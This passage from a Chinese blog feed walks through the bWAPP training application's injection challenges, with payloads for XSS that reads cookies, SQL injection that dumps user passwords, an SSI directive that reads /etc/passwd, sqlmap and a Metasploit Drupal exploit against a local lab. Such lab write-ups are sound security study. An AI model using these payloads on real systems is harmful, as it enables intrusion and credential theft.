src="https://img-blog.csdnimg.cn/20201123113704177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bWAPP</title>
      <link href="2020/11/01/bWAPP/"/>
      <url>2020/11/01/bWAPP/</url>
      
        <content type="html"><![CDATA[<p>**</p><h2 id="A1-Injection"><a href="#A1-Injection" class="headerlink" title="A1 Injection"></a>A1 Injection</h2><p>**<br>**</p><h2 id="HTML-Injection-Reflected-GET"><a href="#HTML-Injection-Reflected-GET" class="headerlink" title="HTML Injection - Reflected (GET)"></a>HTML Injection - Reflected (GET)</h2><p>**</p><p>HTML 注入漏洞是指在用户输入的地方，输入 HTML 文本，被当作 GET 参数传到服务器，服务器以原始格式存储，未采用 HTML 编码，导致 HTML 的特性被浏览器解析执行。这种编码必须在服务器端存储参数的时候进行。</p><p>low:没有对输入进行过滤<br><img src="https://img-blog.csdnimg.cn/2020102720090792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><pre><code class="python">&lt;a href=&quot;https://www.baidu.com/&quot;&gt;baidu&lt;/a&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201027200912524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><pre><code class="python">&lt;script&gt;alert(/haha/)&lt;/script&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201027201050216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>medium:引号被转义，可以考虑<a href="http://ctf.ssleye.com/url.html">url转码</a></p><p><img src="https://img-blog.csdnimg.cn/20201027201412575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>high:还可以在页面会显，但类似<code>&lt;script&gt;alert( /haha/ )&lt;/script&gt;</code>不被执行</p><p>**</p><h2 id="HTML-Injection-Reflected-POST"><a href="#HTML-Injection-Reflected-POST" class="headerlink" title="HTML Injection - Reflected (POST)"></a>HTML Injection - Reflected (POST)</h2><p>**</p><p>同上，区别是提交方式为post，可以用burp suite方便观察</p><p>**</p><h2 id="HTML-Injection-Reflected-URL"><a href="#HTML-Injection-Reflected-URL" class="headerlink" title="HTML Injection - Reflected (URL)"></a>HTML Injection - Reflected (URL)</h2><p>**</p><p>low:</p><pre><code class="python">url:http://127.0.0.1:8080/htmli_current_url.php?a=&lt;script&gt;alert(/haha/)&lt;/script&gt;</code></pre><p>bp抓包，修改url如上</p><p><img src="https://img-blog.csdnimg.cn/20201027204324391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium:<code>&lt;script&gt;document.write(document.URL)&lt;/script&gt;</code></p><p>document对象 – 代表整个HTML 文档,可用来访问页面中的所有元素</p><p>document.URL                设置URL属性从而在同一窗口打开另一网页</p><p>document.write()             动态向页面写入内容</p><p>high:<code> $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;])</code></p><p><a href="https://www.cnblogs.com/hongren/p/7149012.html">大佬链接</a></p><p>**</p><h2 id="HTML-Injection-Stored-Blog"><a href="#HTML-Injection-Stored-Blog" class="headerlink" title="HTML Injection - Stored (Blog)"></a>HTML Injection - Stored (Blog)</h2><p>**</p><p>存储型HTML注入</p><p>ps：反射型页面刷新后就不存在了，而存储型是写入了服务器数据库，刷新后照样存在。</p><p>有一个博客留言界面，试试xss</p><p><img src="https://img-blog.csdnimg.cn/20201027205828647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>也可以读取用户cookie，<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="https://img-blog.csdnimg.cn/20201027205855809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="iFrame-Injection"><a href="#iFrame-Injection" class="headerlink" title="iFrame Injection"></a>iFrame Injection</h2><p>**</p><p>iframe是可用于在HTML页面中嵌入一些文件(如文档，视频等)的一项技术。对iframe最简单的解释就是iframe是一个可以在当前页面中显示其它页面内容的技术</p><p>low:<code>http://127.0.0.1/iframei.php?ParamUrl=&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(&quot;haha&quot;)&lt;/script&gt;&lt;iframe&amp;ParamWidth=250&amp;ParamHeight=234</code><br>//引号绕过，适当闭合，<a href="https://blog.csdn.net/hee_mee/article/details/108553356">链接</a></p><p><img src="https://img-blog.csdnimg.cn/20201027211016359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>meidium：<code>http://127.0.0.1:8080/iframei.php?ParamUrl=%22%3E%3C/iframe%3E%3Cscript%3Ealert(1)%3C/script%3E%3C!--&amp;ParamWidth=250&amp;ParamHeight=250</code></p><p>medium等级不能控制paramurl的输入</p><p><img src="https://img-blog.csdnimg.cn/20201027211235200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>high：对输出进行了限制并且对预定义字符进行了HTML实体编码所以绕过失败…</p><p><a href="https://blog.csdn.net/hee_mee/article/details/108553356">addslashes注入方法</a></p><p>1，设置数据库字符为gbk导致宽字节注入，gbk是多字节编码,两个字节代表一个汉字，而php为单字节编码，又gbk编码存在如運的编码中存在****，故php在读取運时，获取 一个\，再加上addslashes自身会对出现的 特殊字符（如 ’ “）进行转义为 ’ ，故合并之后会出现 \ ’ ,用\ 转义\，进行绕过。</p><p>2，使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入</p><p>3，url解码导致绕过addslashes，base64解码导致绕过addslashes，json编码导致绕过addslashes</p><p>**</p><h2 id="LDAP-Connection-Settings"><a href="#LDAP-Connection-Settings" class="headerlink" title="LDAP Connection Settings"></a>LDAP Connection Settings</h2><p>**</p><p><img src="https://img-blog.csdnimg.cn/20201027212313868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>LDAP过滤器类似于sql查询语句，sql语句的精髓在于拼接单引号，ldap语句的精髓在于拼接括号。</p><p><a href="https://blog.csdn.net/hee_mee/article/details/108568839">不是很懂，放上链接，下次一定</a></p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="Mail-Header-Injection-SMTP"><a href="#Mail-Header-Injection-SMTP" class="headerlink" title="Mail Header Injection (SMTP)"></a>Mail Header Injection (SMTP)</h2><p>**</p><p>电子邮件标题注入：</p><p>通常的做法是网站实施联系表单，反过来将合法用户的电子邮件发送给消息的预期收件人。大多数情况下，这样的联系表单将设置SMTP标头From，Reply-to以便让收件人轻松处理联系表单中的通信，就像其他电子邮件一样。</p><p>不幸的是，除非用户的输入在插入SMTP头之前被验证，否则联系表单可能容易受到电子邮件头插入（也称为SMTP头注入）的攻击。这是因为攻击者可以将额外的头部注入到消息中，从而指示SMTP服务器执行与预期不同的指令。</p><p><a href="https://www.cnblogs.com/hongren/p/7154814.html">下次一定</a></p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h2><p>**</p><p>low:加；</p><p><img src="https://img-blog.csdnimg.cn/20201027215415370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>medium：过滤了&amp;和；将他们替换为空，用  |  可以绕过</p><p><img src="https://img-blog.csdnimg.cn/20201027215452314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>high（不懂。。。）：</p><p>escapeshellcmd函数功能：</p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p><p>**</p><h2 id="OS-Command-Injection-Blind"><a href="#OS-Command-Injection-Blind" class="headerlink" title="OS Command Injection - Blind"></a>OS Command Injection - Blind</h2><p>**</p><p>命令行盲注，通过时间判断是否执行了命令</p><p>正常ping一次</p><p><img src="https://img-blog.csdnimg.cn/20201027220451649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>拼接命令再ping</p><p><img src="https://img-blog.csdnimg.cn/20201027220512842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>发现时间不一样，可以推断出命令执行了，反之，命令错误，没有执行</p><p>**</p><h2 id="PHP-Code-Injection"><a href="#PHP-Code-Injection" class="headerlink" title="PHP Code Injection"></a>PHP Code Injection</h2><p>**</p><p>low:没有对输入的参数进行过滤就直接在eval()函数输出</p><p><img src="https://img-blog.csdnimg.cn/20201027221050776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium:用htmlspecialchars()函数进行了HTML实体编码，没有绕过<br>high:同上（不太懂。。。）</p><p>**</p><h2 id="Server-Side-Includes-SSI-Injection"><a href="#Server-Side-Includes-SSI-Injection" class="headerlink" title="Server-Side Includes (SSI) Injection"></a>Server-Side Includes (SSI) Injection</h2><p>**</p><p>可在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。Server-Side Includes攻击允许通过在HTML页面中注入脚本或远程执行任意代码来利用Web应用程序。</p><p>SSI指令基本格式：&lt;!-– 指令名称=”指令参数”&gt;</p><p>如程序代码:<code>&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></p><p>1．<!-- -->是HTML语法中表示注释，当WEB服务器不支持SSI时，会忽略这些信息。<br>2．#exec 为SSI指令之一。<br>3．cmd 为exec的参数, cat /etc/passwd为参数值，在本指令中指将要执行的命令。</p><p><a href="https://www.cnblogs.com/a-little-bai/p/9426475.html">哭了，不会的好多啊，下次一定</a></p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="SQL-Injection-GET-Search"><a href="#SQL-Injection-GET-Search" class="headerlink" title="SQL Injection (GET/Search)"></a>SQL Injection (GET/Search)</h2><p>**</p><p>low:因为以前在sqli-lab有写过，所以放上过程图</p><p>判断get型</p><p><img src="https://img-blog.csdnimg.cn/202010282157441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201028215821757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>通过报错判断参数处于%之间%</p><p><img src="https://img-blog.csdnimg.cn/20201028215858541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201028215916451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>判断列数为7</p><p><img src="https://img-blog.csdnimg.cn/20201028215929473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查询回显的列数</p><p><img src="https://img-blog.csdnimg.cn/20201028215947454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><pre><code class="python">-1&#39; union select 1,table_name,database(),user(),5,6,7 from information_schema.tables where table_schema=database()#</code></pre><p><img src="https://img-blog.csdnimg.cn/20201028215953431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><pre><code class="python">-1&#39; union select 1,column_name,database(),user(),5,6,7 from information_schema.columns where table_name=&#39;user&#39;#</code></pre><p><img src="https://img-blog.csdnimg.cn/20201028220231831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><pre><code class="python">-1&#39; union select 1,login,password,database(),user(),6,7 from users#</code></pre><p><img src="https://img-blog.csdnimg.cn/20201028220330953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>密码经过尝试md5加密</p><p><img src="https://img-blog.csdnimg.cn/20201028220404109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium：</p><p>使用了addslashes()函数，在php中，addslashes()函数是对输入字符串中的某些预定义字符前添加反斜杠，预定义字符是： ‘ ,  “ ,   \ ,   null</p><p>high:使用了mysql_real_escape_string()函数。</p><p>**</p><h2 id="SQL-Injection-GET-Select"><a href="#SQL-Injection-GET-Select" class="headerlink" title="SQL Injection (GET/Select)"></a>SQL Injection (GET/Select)</h2><p>**</p><p>和上边那个差不多，一样的方法，不过这个是数字型注入，不用单引号了</p><p>**</p><h2 id="SQL-Injection-POST-Search"><a href="#SQL-Injection-POST-Search" class="headerlink" title="SQL Injection (POST/Search)"></a>SQL Injection (POST/Search)</h2><p>**</p><p>和get型方法一样，类型是post，burp suite就行，sqlmap也可以</p><p>**</p><h2 id="SQL-Injection-GET-Select-1"><a href="#SQL-Injection-GET-Select-1" class="headerlink" title="SQL Injection (GET/Select)"></a>SQL Injection (GET/Select)</h2><p>**</p><p>和get型方法一样，类型是post，burp suite就行，sqlmap也可以</p><p>**</p><h2 id="SQL-Injection-AJAX-JSON-jQuery"><a href="#SQL-Injection-AJAX-JSON-jQuery" class="headerlink" title="SQL Injection (AJAX/JSON/jQuery)"></a>SQL Injection (AJAX/JSON/jQuery)</h2><p>**</p><p>ajax的sql注入：通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行实时更新。</p><p>low:就平常的sql注入，区别是加了个%</p><p><img src="https://img-blog.csdnimg.cn/20201030205647553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20201030205653456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>后边仿照前几题</p><p>medium：用了addslashes()函数防御<br>high：用了mysql_real_escape_string()函数防御</p><p>**</p><h2 id="SQL-Injection-CAPTCHA"><a href="#SQL-Injection-CAPTCHA" class="headerlink" title="SQL Injection (CAPTCHA)"></a>SQL Injection (CAPTCHA)</h2><p>**</p><p>与sql injection(get/search)相同的查询方法。</p><p>**</p><h2 id="SQL-Injection-Login-Form-Hero"><a href="#SQL-Injection-Login-Form-Hero" class="headerlink" title="SQL Injection (Login Form/Hero)"></a>SQL Injection (Login Form/Hero)</h2><p>**</p><p>low:万能密码</p><p><img src="https://img-blog.csdnimg.cn/20201030211215751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>medium和hign过滤挺强，没绕过去</p><p>**</p><h2 id="SQL-Injection-Login-Form-User"><a href="#SQL-Injection-Login-Form-User" class="headerlink" title="SQL Injection (Login Form/User)"></a>SQL Injection (Login Form/User)</h2><p>**</p><p>同上一道题</p><p><img src="https://img-blog.csdnimg.cn/20201030211505644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium和high。。。。。</p><p>**</p><h2 id="SQL-Injection-SQLite"><a href="#SQL-Injection-SQLite" class="headerlink" title="SQL Injection (SQLite)"></a>SQL Injection (SQLite)</h2><p>**</p><p>sqlite_master表和mysql数据库中系统表information_schema不一样的是，sqlite_master不存在类似“ column_name”的字段，但是它有一个sql字段，该字段保存了各个表的结构，包括表名，字段名和类型 ，因此可以通过查询sql字段获取各个表的列名，SQLite含有一张内置表“sqlite_master”,表里存储着type、name、tbl_name、rootpage、sql五个字段。</p><pre><code class="python">1 读取表名：select group_concat(name) from sqlite_master where type=&#39;table&#39; 2 读取字段：select group_concat(sql) from sqlite_master where type=&#39;table&#39; and name=&#39;表名&#39;</code></pre><p><a href="https://www.dazhuanlan.com/2020/01/02/5e0d818c7923a/">click</a></p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="SQL-Injection-Drupal"><a href="#SQL-Injection-Drupal" class="headerlink" title="SQL Injection (Drupal)"></a>SQL Injection (Drupal)</h2><p>**</p><p>这次是一个复现<a href="https://www.freebuf.com/news/47690.html">漏洞</a></p><p>直接使用msf进行攻击</p><p>use exploit/multi/按tab键进行自动查找。</p><p>use exploit/multi/http/drupal_drupageddon</p><p>set targeturi /drupal/</p><p>set RHOST 192.168.174.130</p><p>set rport 80</p><p>exploit</p><p>拿到shell</p><p>上传木马</p><p>**</p><h2 id="SQL-Injection-Stored-Blog"><a href="#SQL-Injection-Stored-Blog" class="headerlink" title="SQL Injection - Stored (Blog)"></a>SQL Injection - Stored (Blog)</h2><p>**</p><p>插入代码</p><pre><code class="python">insert into blog(date,entry,owner) values(now(), &#39;$entry&#39;, &#39;bee&#39;);</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030215622405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆库<code>test&#39;, (select database())) #</code></p><p>爆表<code>test&#39;, (select group_concat(table_name) from information_schema.tables where table_schema=database())) #</code></p><p>同理继续</p><p>medium和high单引号被转义，分别用了addslashes()和mysqli_real_escape_string()函数做防护，无法注入，xss无防护，可</p><pre><code class="python">&lt;script&gt;alert(/haha/)&lt;/script&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030220027593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>**</p><h2 id="SQL-Injection-Stored-SQLite"><a href="#SQL-Injection-Stored-SQLite" class="headerlink" title="SQL Injection - Stored (SQLite)"></a>SQL Injection - Stored (SQLite)</h2><p>**</p><p>Mysql换成了sqlite，sql语句写法变了, 思路不变，前边SQL Injection (SQLite)有</p><p>**</p><h2 id="SQL-Injection-Stored-User-Agent"><a href="#SQL-Injection-Stored-User-Agent" class="headerlink" title="SQL Injection - Stored (User-Agent)"></a>SQL Injection - Stored (User-Agent)</h2><p>**</p><p>bp抓包，改代理</p><p><img src="https://img-blog.csdnimg.cn/20201030220517264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>medium和high分别用了addslashes()和mysqli_real_escape_string()函数做防护，绕不过</p><p>**</p><h2 id="SQL-Injection-Stored-XML"><a href="#SQL-Injection-Stored-XML" class="headerlink" title="SQL Injection - Stored (XML)"></a>SQL Injection - Stored (XML)</h2><p>**</p><p>SQL注入</p><p><img src="https://img-blog.csdnimg.cn/20201030221024717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>sql注入的原理基本不变,  只不过注入点不同而已,</p><p>直接访问sql_8-2.php,  将xml实体POST即可</p><p>加单引号，得到回显之后,  接下来就是判断sql语句,  由于是写入网页的bee值,  那么猜测为update语句<code>UPDATE users SET secret = &#39;$secret&#39; WHERE login = &#39;$login&#39;;</code></p><p>于是用extractvalue()报错注入:<code>&lt;reset&gt;&lt;login&gt;bee&#39; or  extractvalue(1, concat(0x7e, (select database()), 0x7e)) or &#39;1&#39;=&#39;1&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</code></p><p><a href="https://blog.csdn.net/angry_program/article/details/104545171#0x0D%E3%80%81SQL%20Injection%20-%20Stored%20%28XML%29">大佬详解</a></p><ul><li><input disabled="" type="checkbox"> mark</li></ul><p>**</p><h2 id="SQL-Injection-Blind-Boolean-Based"><a href="#SQL-Injection-Blind-Boolean-Based" class="headerlink" title="SQL Injection - Blind - Boolean-Based"></a>SQL Injection - Blind - Boolean-Based</h2><p>**</p><p><img src="https://img-blog.csdnimg.cn/20201030222447805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>盲注，通过回显存在或不存在判断是否正确</p><p>这里不多说了，方法一样<a href="https://blog.csdn.net/angry_program/article/details/104408506">click</a></p><p>手工盲注很麻烦，直接用sqlmap跑就可以了</p><pre><code class="python">sqlmap -u &quot;http://localhost:8080/bWAPP/sqli_4.php?action=search&amp;title=Iron Man&quot; --cookie=&quot;security_level=0; PHPSESSID=oq5ku61t3uqkr80mok9g30qc74&quot; --dbs --batch</code></pre><p>记得传cookie,  指定security_level等级, 用–batch选用默认操作</p><p><img src="https://img-blog.csdnimg.cn/20201030223236273.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考链接：<a href="https://blog.csdn.net/angry_program/article/details/104545171">https://blog.csdn.net/angry_program/article/details/104545171</a></p><p>**</p><h2 id="SQL-Injection-Blind-Time-Based"><a href="#SQL-Injection-Blind-Time-Based" class="headerlink" title="SQL Injection - Blind - Time-Based"></a>SQL Injection - Blind - Time-Based</h2><p>**</p><p>通过email说明不能通过回显，盲注了</p><p>题目也提示说延时注入</p><p>具体方法在我前边写过的一篇<a href="https://blog.csdn.net/gongjingege/article/details/109137816">博文</a>里，里边有时间延迟型注入的说明</p><p>medium和high采用了addslashed()和mysqli_real_escape_string()函数, 且mysql编码和os编码一致, 无法用宽字节绕过, 安全。</p><p>**</p><h2 id="SQL-Injection-Blind-SQLite"><a href="#SQL-Injection-Blind-SQLite" class="headerlink" title="SQL Injection - Blind (SQLite)"></a>SQL Injection - Blind (SQLite)</h2><p>**</p><p>布尔盲注+sqlite</p><p>方法前面博文和前几个题有介绍，sqlite语法也在前边，就不多写了。。。</p><p>**</p><h2 id="SQL-Injection-Blind-WS-SOAP"><a href="#SQL-Injection-Blind-WS-SOAP" class="headerlink" title="SQL Injection - Blind (WS/SOAP)"></a>SQL Injection - Blind (WS/SOAP)</h2><p>**</p><p>对报错的回显进行了修饰，盲注</p><p>Substr（（sql），x，y）     //（sql）内添加查询语句就可以将返回的结果转成字符将这一串的字符以第x个开始向下截取y个。</p><p>Ascii（） //该方法是将字符所对应的ascii码转换一下并显示出来。</p><pre><code class="python">1&#39; and (ascii(substr(select user()),1,1)=98)</code></pre><p><img src="https://img-blog.csdnimg.cn/2020103117061990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>修改为2，1；3，1；继续尝试，得到bwapp，更为详细的在<a href="https://blog.csdn.net/weixin_33747129/article/details/94471353">这里</a></p><p>**</p><h2 id="XML-XPath-Injection-Login-Form"><a href="#XML-XPath-Injection-Login-Form" class="headerlink" title="XML/XPath Injection (Login Form)"></a>XML/XPath Injection (Login Form)</h2><p>**</p><p>账号密码永真即可</p><p>bee’ or ‘1’=’1</p><p><img src="https://img-blog.csdnimg.cn/20201031171534819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvbmdqaW5nZWdl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>medium和high过滤，安全</p><p>**</p><h2 id="XML-XPath-Injection-Search"><a href="#XML-XPath-Injection-Search" class="headerlink" title="XML/XPath Injection (Search)"></a>XML/XPath Injection (Search)</h2><p>**</p><p>源码：<code>$result = $xml-&gt;xpath(&quot;//hero[contains(genre, &#39;$genre&#39;)]/movie&quot;);</code></p><p>根据这个闭合绕过就行</p><pre><code class="python">action&#39;)] | //* | //*[(&#39;&amp;action=search//  /hero[contains(genre, &#39;action&#39;)] | //* | //*[(&#39;&#39;)]/movie&quot;</code></pre><p><img 